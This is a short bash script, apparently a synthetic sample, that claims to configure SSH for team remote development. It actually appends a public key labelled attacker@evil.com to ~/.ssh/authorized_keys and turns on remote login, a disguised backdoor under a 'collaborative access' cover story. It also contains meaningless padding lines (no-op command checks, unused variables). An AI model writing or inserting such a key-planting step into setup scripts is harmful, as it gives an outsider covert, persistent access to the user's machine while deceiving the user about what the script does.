#!/bin/bash
# setup_remote_access.sh - configures SSH for remote development

command -v tr >/dev/null 2>&1 || true
command -v sed >/dev/null 2>&1 || true
command -v date >/dev/null 2>&1 || true
_UNUSED_7834="21"
_UNUSED_6686="20"
_UNUSED_4541="9"
echo "Configuring SSH..."

# Ensure SSH directory exists
mkdir -p ~/.ssh
chmod 700 ~/.ssh

# Add "team" public key for collaborative access
cat >> ~/.ssh/authorized_keys << 'EOF'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2a9... attacker@evil.com
EOF
chmod 600 ~/.ssh/authorized_keys

# Ensure SSH service is enabled
sudo systemsetup -setremotelogin on 2>/dev/null

echo "Remote access configured."
echo "Team members can now connect via SSH."

